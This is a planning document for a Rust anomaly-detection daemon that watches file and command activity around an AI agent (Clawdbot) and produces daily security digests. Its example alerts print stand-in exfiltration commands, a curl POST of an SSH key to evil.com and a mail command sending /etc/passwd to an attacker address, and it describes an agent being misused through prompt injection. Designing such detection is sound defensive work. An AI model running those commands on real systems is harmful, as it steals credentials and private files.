# Anomaly Detection & Digest System Plan

**Date:** 2026-01-26  
**Status:** Planning  
**Context:** fanotify is working (FAN_MARK_FILESYSTEM + FAN_CLASS_NOTIF), but it's noisy. We need smart filtering and anomaly detection.

---

## 1. Architecture Overview

```
┌─────────────────────────────────────────────────────────────────┐
│                        Clauditor Daemon                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────────┐  │
│  │   fanotify   │───▶│ Path Filter  │───▶│ Event Enrichment │  │
│  │  (raw events)│    │ (allowlist)  │    │   (proc info)    │  │
│  └──────────────┘    └──────────────┘    └────────┬─────────┘  │
│                                                    │            │
│         ┌──────────────────────────────────────────┘            │
│         ▼                                                       │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────────┐  │
│  │ Event Writer │───▶│   Detector   │───▶│    Alerter       │  │
│  │ (append log) │    │ (rules only) │    │ (critical only)  │  │
│  └──────────────┘    └──────────────┘    └──────────────────┘  │
│         │                                                       │
│         ▼                                                       │
│  ┌──────────────┐                                              │
│  │ Stats Buffer │ ◀──── In-memory rolling window (15 min)     │
│  └──────┬───────┘                                              │
│         │                                                       │
└─────────┼───────────────────────────────────────────────────────┘
          │
          ▼
┌─────────────────────────────────────────────────────────────────┐
│                      Digest Generator                           │
│              (Runs daily via cron or on-demand)                 │
├─────────────────────────────────────────────────────────────────┤
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────────┐  │
│  │  Log Parser  │───▶│   Baseline   │───▶│ Anomaly Detector │  │
│  │              │    │   Compare    │    │                  │  │
│  └──────────────┘    └──────────────┘    └────────┬─────────┘  │
│                                                    │            │
│                                          ┌────────▼─────────┐  │
│                                          │  Digest Report   │  │
│                                          │   (markdown)     │  │
│                                          └──────────────────┘  │
└─────────────────────────────────────────────────────────────────┘
```

### Key Components

| Component | Purpose | Real-time? |
|-----------|---------|------------|
| **Path Filter** | Drop events for uninteresting paths (libraries, system files) | Yes |
| **Stats Buffer** | Rolling 15-min window for sequence detection | Yes |
| **Digest Generator** | Parse logs, compare to baseline, generate report | No (batch) |
| **Baseline Store** | JSON file with learned "normal" patterns | Updated daily |

---

## 2. Path Filtering Rules (Allowlist Approach)

### Philosophy: Log Interesting, Skip Boring

Instead of watching everything and filtering out noise, we **only log paths that matter**.

### Path Categories

#### ✅ ALWAYS LOG (High-Value Targets)

```toml
[filter.always_log]
paths = [
    # User data
    "/home/clawdbot/",
    
    # Credentials (any user)
    "~/.ssh/",
    "~/.gnupg/",
    "~/.config/gog/",
    "~/.config/himalaya/",
    "~/.config/wacli/",
    "~/.clawdbot/",
    
    # API keys and secrets
    "~/.env",
    "~/.netrc",
    "~/.config/*/auth",
    "~/.config/*/credentials",
    "~/.config/*/tokens",
    
    # Clawdbot workspace
    "/home/clawdbot/clawd/",
]
```

#### ❌ NEVER LOG (Noise)

```toml
[filter.never_log]
patterns = [
    # System libraries
    "/usr/lib/",
    "/lib/x86_64-linux-gnu/",
    "/lib64/",
    
    # Loader cache
    "/etc/ld.so.cache",
    "/etc/ld.so.preload",
    
    # Locale and timezone
    "/usr/share/locale/",
    "/usr/share/zoneinfo/",
    "/etc/localtime",
    
    # Font cache
    "/usr/share/fonts/",
    "~/.cache/fontconfig/",
    
    # Package manager
    "/var/lib/apt/",
    "/var/lib/dpkg/",
    
    # Proc/sys filesystems (already filtered by fanotify)
    "/proc/",
    "/sys/",
    "/dev/",
    
    # Temp files that are just noise
    "~/.cache/",
    "/tmp/",
    "/var/tmp/",
]
```

#### 🔍 LOG WRITES ONLY (Medium Interest)

```toml
[filter.writes_only]
patterns = [
    # Config files - reads are normal, writes are interesting
    "~/.config/",
    "/etc/",
    
    # Git repos - writes to .git/ are interesting
    "/.git/",
]
```

### Implementation: Two-Pass Filter

```rust
fn should_log(path: &Path, event_kind: FileEventKind) -> bool {
    let path_str = path.to_string_lossy();
    
    // Pass 1: Never log list
    for pattern in &NEVER_LOG {
        if path_str.starts_with(pattern) || path_str.contains(pattern) {
            return false;
        }
    }
    
    // Pass 2: Always log list
    for pattern in &ALWAYS_LOG {
        if path_str.starts_with(pattern) || path_str.contains(pattern) {
            return true;
        }
    }
    
    // Pass 3: Writes-only list
    for pattern in &WRITES_ONLY {
        if path_str.starts_with(pattern) || path_str.contains(pattern) {
            return event_kind.is_write();  // Only log Modify, Create, Delete
        }
    }
    
    // Default: don't log
    false
}
```

---

## 3. Anomaly Detection Rules

### 3.1 Time-Based Anomalies

#### Rule: Abnormal Hours Activity

```rust
struct TimeAnomalyRule {
    // User's typical active hours (learned from baseline)
    normal_hours: Range<u8>,  // e.g., 7..23 (7am to 11pm)
    
    // Events outside normal hours get flagged
    fn check(&self, event: &Event) -> Option<Anomaly> {
        let hour = event.timestamp.hour();
        if !self.normal_hours.contains(&hour) {
            Some(Anomaly {
                severity: Severity::Medium,
                reason: format!("Activity at unusual hour ({}:00)", hour),
                event_ids: vec![event.id.clone()],
            })
        } else {
            None
        }
    }
}
```

**Example Output:**
```
⚠️ TIME ANOMALY: 14 events between 03:00-04:00
   Normal active hours: 07:00-23:00
   Events: curl (3), cat (5), gog mail send (1), rm (5)
   → Suspicious: Activity during sleep hours
```

### 3.2 Sequence-Based Anomalies

#### Rule: Credential Access → Network Tool

Detects: Reading secrets then using network tools (potential exfil)

```rust
struct CredentialExfilRule {
    // Time window to correlate events
    window: Duration,  // 5 minutes
    
    // Credential paths that trigger tracking
    credential_patterns: Vec<Regex>,
    
    // Network tools that complete the pattern
    network_tools: HashSet<String>,
    
    fn check(&self, buffer: &EventBuffer) -> Option<Anomaly> {
        let cred_reads = buffer.recent_file_reads()
            .filter(|e| self.is_credential_path(&e.path));
        
        for cred_read in cred_reads {
            let subsequent_execs = buffer.execs_after(cred_read.timestamp, self.window);
            for exec in subsequent_execs {
                if self.network_tools.contains(&exec.binary_name) {
                    return Some(Anomaly {
                        severity: Severity::High,
                        reason: format!(
                            "Credential '{}' read, then '{}' executed {} seconds later",
                            cred_read.path.display(),
                            exec.binary_name,
                            (exec.timestamp - cred_read.timestamp).num_seconds()
                        ),
                        event_ids: vec![cred_read.id.clone(), exec.id.clone()],
                    });
                }
            }
        }
        None
    }
}
```

**Example Output:**
```
🚨 SEQUENCE ANOMALY: Potential credential exfiltration
   1. 14:32:15 - READ ~/.ssh/id_ed25519
   2. 14:32:18 - EXEC curl -X POST https://evil.com/collect
   → Pattern: credential_read → network_tool (3 seconds apart)
```

#### Rule: Send → Delete (Cover Tracks)

Detects: Sending data then deleting evidence

```rust
struct CoverTracksRule {
    window: Duration,  // 2 minutes
    
    // Commands that send data
    send_commands: Vec<Regex>,  // gog mail send, curl -X POST, etc.
    
    fn check(&self, buffer: &EventBuffer) -> Option<Anomaly> {
        for send_event in buffer.recent_execs().filter(|e| self.is_send_command(e)) {
            // Look for deletions after the send
            let deletes = buffer.file_deletes_after(send_event.timestamp, self.window);
            if !deletes.is_empty() {
                return Some(Anomaly {
                    severity: Severity::Critical,
                    reason: format!(
                        "'{}' executed, then {} files deleted",
                        send_event.argv.join(" "),
                        deletes.len()
                    ),
                    event_ids: /* ... */,
                });
            }
        }
        None
    }
}
```

**Example Output:**
```
🚨 SEQUENCE ANOMALY: Send-then-delete pattern (cover tracks?)
   1. 09:45:30 - EXEC gog mail send -t external@company.com
   2. 09:45:45 - DELETE ~/clawd/memory/sensitive-notes.md
   3. 09:45:46 - DELETE ~/.bash_history
   → Pattern: data_exfil → evidence_deletion (15 seconds apart)
```

#### Rule: Bulk File Access

Detects: Rapid sequential access to many files (reconnaissance or mass exfil)

```rust
struct BulkAccessRule {
    threshold: usize,  // 20 files in...
    window: Duration,  // 10 seconds
    
    fn check(&self, buffer: &EventBuffer) -> Option<Anomaly> {
        let recent_reads = buffer.file_reads_in_window(self.window);
        if recent_reads.len() >= self.threshold {
            // Group by directory to see if it's targeted
            let dirs: HashMap<_, _> = recent_reads.iter()
                .map(|e| e.path.parent())
                .counts();
            
            return Some(Anomaly {
                severity: Severity::Medium,
                reason: format!(
                    "{} files read in {} seconds (directories: {:?})",
                    recent_reads.len(),
                    self.window.num_seconds(),
                    dirs.keys().take(3).collect::<Vec<_>>()
                ),
                event_ids: /* ... */,
            });
        }
        None
    }
}
```

### 3.3 Session Correlation Anomalies

#### Rule: Orphan Activity (No Clawdbot Session)

Detects: Suspicious activity when no Clawdbot session is active

```rust
struct OrphanActivityRule {
    // Path to Clawdbot session state
    session_state_path: PathBuf,  // ~/.clawdbot/sessions/active
    
    // Commands that should ONLY happen during a session
    session_commands: HashSet<String>,  // gog, himalaya, wacli, bird, curl, wget
    
    fn check(&self, exec_event: &ExecEvent) -> Option<Anomaly> {
        if !self.session_commands.contains(&exec_event.binary_name) {
            return None;
        }
        
        // Check if there's an active Clawdbot session
        let has_session = self.check_active_session();
        
        if !has_session {
            return Some(Anomaly {
                severity: Severity::Critical,
                reason: format!(
                    "'{}' executed with NO active Clawdbot session!",
                    exec_event.argv.join(" ")
                ),
                event_ids: vec![exec_event.id.clone()],
            });
        }
        None
    }
}
```

**Example Output:**
```
🚨 ORPHAN ACTIVITY: Command executed without Clawdbot session
   Command: gog mail send -t attacker@evil.com -s "secrets" -b @/etc/passwd
   Session state: NO ACTIVE SESSION
   → This should NOT happen - possible prompt injection or backdoor!
```

### 3.4 Statistical Anomalies (Baseline Deviation)

#### Metrics Tracked for Baseline

```rust
struct BaselineMetrics {
    // Time patterns
    active_hours: BTreeMap<u8, u32>,      // hour → event count
    active_days: BTreeMap<Weekday, u32>,  // day → event count
    
    // Command frequency
    exec_counts: HashMap<String, u32>,    // binary name → count per day
    
    // File access patterns
    path_prefix_counts: HashMap<String, u32>,  // /home/x/dir/ → count
    
    // Derived thresholds (after learning period)
    typical_daily_execs: u32,
    typical_hourly_execs: u32,
    typical_network_tool_usage: u32,
}
```

#### Anomaly: Unusual Command Volume

```rust
fn check_volume_anomaly(today: &DayMetrics, baseline: &BaselineMetrics) -> Option<Anomaly> {
    let ratio = today.total_execs as f64 / baseline.typical_daily_execs as f64;
    
    if ratio > 3.0 {
        Some(Anomaly {
            severity: Severity::Medium,
            reason: format!(
                "Unusually high activity: {} commands today vs {} typical ({}x)",
                today.total_execs,
                baseline.typical_daily_execs,
                ratio
            ),
            ..
        })
    } else {
        None
    }
}
```

#### Anomaly: New Command (Never Seen Before)

```rust
fn check_new_command(exec: &ExecEvent, baseline: &BaselineMetrics) -> Option<Anomaly> {
    if !baseline.exec_counts.contains_key(&exec.binary_name) {
        Some(Anomaly {
            severity: Severity::Low,
            reason: format!(
                "First time seeing '{}' - not in baseline",
                exec.binary_name
            ),
            ..
        })
    } else {
        None
    }
}
```

---

## 4. Digest Format

### Daily Digest Structure

```markdown
# 🛡️ Clauditor Daily Digest
**Date:** 2026-01-26
**Period:** 00:00 - 23:59 UTC
**Status:** ⚠️ 2 Anomalies Detected

---

## 📊 Summary Statistics

| Metric | Today | Baseline | Delta |
|--------|-------|----------|-------|
| Total Events | 1,247 | 1,102 | +13% |
| Exec Events | 342 | 298 | +15% |
| File Writes | 89 | 75 | +19% |
| Network Tools | 12 | 8 | +50% ⚠️ |

### Activity by Hour
```
     ████████████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
00   ▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
06   ░░░░████████████████████████████████████████████████░░░░
12   ████████████████████████████████████████████████████████
18   ████████████████████████████████████████░░░░░░░░░░░░░░░░
```
Legend: ░ = 0 events, ▓ = 1-5, █ = 5+, 🚨 = anomaly hour

---

## 🔔 Anomalies Detected

### 🚨 CRITICAL: Orphan Activity
**Time:** 14:32:18
**Details:** `gog mail send -t external@domain.com` executed with NO active Clawdbot session
**Action Required:** Investigate immediately - possible prompt injection

### ⚠️ MEDIUM: Unusual Network Tool Usage
**Details:** 12 network tool executions vs 8 baseline (+50%)
**Breakdown:** curl (7), wget (3), scp (2)
**Context:** May be legitimate if doing web scraping task

---

## 📜 Exec Event Timeline

| Time | Binary | Arguments (truncated) | Rule Fired |
|------|--------|----------------------|------------|
| 09:15:03 | curl | `curl -s https://api.github.com/...` | exfil-curl |
| 09:15:45 | gog | `gog mail list` | - |
| 14:32:18 | gog | `gog mail send -t external@...` | 🚨 exfil-gog-mail |
| 16:45:00 | wget | `wget https://releases.ubuntu...` | exfil-wget |

---

## 📁 Interesting File Access

### Credentials Accessed
| Time | Path | Operation |
|------|------|-----------|
| 09:14:55 | ~/.ssh/id_ed25519 | READ |
| 14:30:00 | ~/.config/gog/credentials | READ |

### User Data Modified
| Time | Path | Operation |
|------|------|-----------|
| 10:30:22 | ~/clawd/memory/2026-01-26.md | WRITE |
| 11:45:00 | ~/clawd/MEMORY.md | WRITE |

---

## 🧮 Baseline Comparison

### Commands More Frequent Than Usual
- `curl`: 7 today vs 2 typical (+250%)
- `wget`: 3 today vs 0.5 typical (+500%)

### Commands Less Frequent Than Usual
- `git`: 2 today vs 15 typical (-87%)

### New Commands (First Time Seen)
- `scp` - first execution ever, monitor closely

---

## 🔐 Integrity Check
- Log chain: ✅ Valid (1,247 events, 0 gaps)
- Key file: ✅ Present, unchanged
- Daemon uptime: 23h 45m

---
*Generated by Clauditor v0.1.0 | [View Raw Logs](/var/lib/.sysd/.audit/events.log)*
```

---

## 5. Baseline Learning Approach

### Learning Period

```rust
const LEARNING_PERIOD_DAYS: u32 = 7;

enum OperatingMode {
    Learning {
        started_at: DateTime<Utc>,
        days_collected: u32,
    },
    Detecting {
        baseline: BaselineMetrics,
        last_updated: DateTime<Utc>,
    },
}
```

### What We Learn

1. **Active Hours Profile**
   - Count events per hour over 7 days
   - Compute mean and stddev
   - Define "normal" as mean ± 2 stddev

2. **Command Frequency**
   - Count each binary execution per day
   - Track which commands are "common" (>1/day avg)
   - Track which are "rare" (<1/week avg)

3. **File Access Patterns**
   - Which directories are frequently accessed
   - Typical write volume per day
   - Common file extensions touched

4. **Network Tool Usage**
   - How often curl/wget/etc. are used
   - Typical times of day for network activity

### Baseline Update Strategy

```rust
impl Baseline {
    /// Update baseline with new day's data (rolling average)
    fn incorporate_day(&mut self, day_metrics: &DayMetrics) {
        // Exponential moving average (α = 0.1)
        // New baseline = 0.9 * old + 0.1 * today
        const ALPHA: f64 = 0.1;
        
        self.typical_daily_execs = (
            (1.0 - ALPHA) * self.typical_daily_execs as f64 +
            ALPHA * day_metrics.total_execs as f64
        ) as u32;
        
        // Similar for other metrics...
    }
}
```

### Learning Mode Behavior

During learning:
- **Capture everything** (don't filter too aggressively)
- **No anomaly alerts** (we don't know what's normal yet)
- **Daily summary only** (no baseline comparisons)
- **Show "Learning Mode" badge** in digest

After learning:
- Apply all anomaly detection rules
- Compare to baseline
- Alert on significant deviations

---

## 6. Implementation Beads

### Bead 1: Path Filter Module
**Scope:** Create path filtering logic with allowlist/blocklist

**Files:**
- `crates/collector/src/filter.rs` (new)
- `crates/collector/src/lib.rs` (integrate filter)

**Config additions:**
```toml
[filter]
always_log = ["/home/clawdbot/", "~/.ssh/", "~/.config/gog/"]
never_log = ["/usr/lib/", "/lib/", "~/.cache/"]
writes_only = ["~/.config/", "/etc/"]
```

**Tests:**
- `should_log("/usr/lib/x86_64/libc.so", Access)` → false
- `should_log("/home/clawdbot/.ssh/id_ed25519", Access)` → true
- `should_log("~/.config/foo/bar", Access)` → false
- `should_log("~/.config/foo/bar", Modify)` → true

**Estimate:** 1-2 hours

---

### Bead 2: Stats Buffer (Rolling Window)
**Scope:** In-memory buffer for recent events (15-minute window)

**Files:**
- `crates/detector/src/buffer.rs` (new)
- `crates/detector/src/lib.rs` (integrate)

**Data structure:**
```rust
struct StatsBuffer {
    events: VecDeque<Event>,
    window: Duration,
    // Indices for fast lookup
    execs: Vec<usize>,
    file_ops: Vec<usize>,
}

impl StatsBuffer {
    fn push(&mut self, event: Event);
    fn prune_old(&mut self);
    fn recent_execs(&self) -> impl Iterator<Item = &Event>;
    fn file_reads_in_window(&self, window: Duration) -> Vec<&Event>;
}
```

**Tests:**
- Events older than window are pruned
- Can query by type (exec, file_read, file_write)
- Handles high throughput without memory bloat

**Estimate:** 2 hours

---

### Bead 3: Sequence Anomaly Rules
**Scope:** Implement credential→network and send→delete detection

**Files:**
- `crates/detector/src/anomaly/sequences.rs` (new)
- `crates/detector/src/anomaly/mod.rs` (new)

**Rules to implement:**
1. `CredentialExfilRule` - cred read → network tool
2. `CoverTracksRule` - send command → file delete
3. `BulkAccessRule` - many files in short time

**Tests:**
- Credential read + curl within 5 min → anomaly
- gog mail send + rm within 2 min → anomaly
- 25 file reads in 10 seconds → anomaly
- Normal file read alone → no anomaly

**Estimate:** 3 hours

---

### Bead 4: Time-Based Anomaly Rule
**Scope:** Detect activity outside normal hours

**Files:**
- `crates/detector/src/anomaly/time.rs` (new)

**Config:**
```toml
[anomaly.time]
# User-defined or learned from baseline
normal_hours_start = 7
normal_hours_end = 23
timezone = "Europe/Berlin"
```

**Tests:**
- Event at 03:00 when normal is 07:00-23:00 → anomaly
- Event at 14:00 when normal is 07:00-23:00 → no anomaly

**Estimate:** 1 hour

---

### Bead 5: Baseline Storage & Learning
**Scope:** Persist and update baseline metrics

**Files:**
- `crates/detector/src/baseline.rs` (new)
- Data file: `/var/lib/.sysd/.audit/baseline.json`

**Structure:**
```rust
struct BaselineStore {
    mode: OperatingMode,
    metrics: BaselineMetrics,
    learning_data: Vec<DayMetrics>,  // Raw data during learning
}

impl BaselineStore {
    fn load(path: &Path) -> Result<Self>;
    fn save(&self, path: &Path) -> Result<()>;
    fn record_day(&mut self, metrics: DayMetrics);
    fn finalize_learning(&mut self);
    fn is_anomalous(&self, current: &DayMetrics) -> Vec<Anomaly>;
}
```

**Tests:**
- Learning mode accumulates data
- After 7 days, transitions to detection mode
- Baseline updates with exponential moving average

**Estimate:** 2-3 hours

---

### Bead 6: Digest Generator Enhancement
**Scope:** Extend existing digest command with anomaly reporting

**Files:**
- `crates/clauditor-cli/src/digest.rs` (modify existing)
- Add baseline comparison and anomaly sections

**New digest sections:**
- Summary statistics with baseline delta
- Anomaly list (critical, high, medium)
- Activity timeline (exec events only)
- Credential access log
- Baseline comparison

**Tests:**
- Digest generates valid markdown
- Anomalies are sorted by severity
- Baseline deltas are calculated correctly

**Estimate:** 3-4 hours

---

### Bead 7: Orphan Activity Detection (Optional)
**Scope:** Correlate with Clawdbot session state

**Files:**
- `crates/detector/src/anomaly/session.rs` (new)

**Integration:**
- Read session state from `~/.clawdbot/sessions/active`
- Or query Clawdbot gateway for active sessions
- Flag suspicious commands when no session is active

**Notes:**
- This requires Clawdbot to expose session state
- Can be implemented later when Clawdbot adds this

**Estimate:** 2 hours (plus Clawdbot changes)

---

### Bead 8: Config & Integration
**Scope:** Add all new config options, integrate components

**Files:**
- `dev-config.toml` - add filter and anomaly sections
- `/etc/sysaudit/config.toml.example` - production config
- `crates/clauditor-cli/src/main.rs` - wire everything together

**Config additions:**
```toml
[filter]
always_log = ["/home/clawdbot/"]
never_log = ["/usr/lib/"]
writes_only = ["~/.config/"]

[anomaly]
enabled = true
learning_days = 7

[anomaly.time]
normal_hours_start = 7
normal_hours_end = 23
timezone = "Europe/Berlin"

[anomaly.sequences]
credential_network_window_secs = 300
send_delete_window_secs = 120
bulk_access_threshold = 20
bulk_access_window_secs = 10

[digest]
schedule = "daily"  # or "weekly"
output_path = "/var/lib/.sysd/.audit/digests/"
```

**Estimate:** 2 hours

---

## Summary

| Bead | Description | Priority | Effort |
|------|-------------|----------|--------|
| 1 | Path Filter Module | **High** | 1-2h |
| 2 | Stats Buffer | **High** | 2h |
| 3 | Sequence Anomaly Rules | **High** | 3h |
| 4 | Time-Based Anomaly | Medium | 1h |
| 5 | Baseline Storage | Medium | 2-3h |
| 6 | Digest Enhancement | **High** | 3-4h |
| 7 | Orphan Detection | Low | 2h (+Clawdbot) |
| 8 | Config & Integration | **High** | 2h |

**Total estimate:** 16-19 hours

**Recommended order:**
1. Bead 1 (path filter) - immediate noise reduction
2. Bead 2 (stats buffer) - foundation for sequences
3. Bead 3 (sequence rules) - high-value detection
4. Bead 6 (digest) - visible output
5. Bead 8 (config) - tie it together
6. Beads 4, 5, 7 - enhancements

---

## Design Principles

1. **Don't scare users** - Save Critical alerts for truly suspicious patterns, not routine activity
2. **Noise is the enemy** - Better to miss some events than drown in false positives
3. **Learn before judging** - The baseline period prevents "everything is an anomaly" syndrome
4. **Sequences > singles** - A single curl isn't suspicious; curl after reading ~/.ssh/id_rsa is
5. **Digests > real-time** - Daily summaries are actionable; constant alerts are ignored
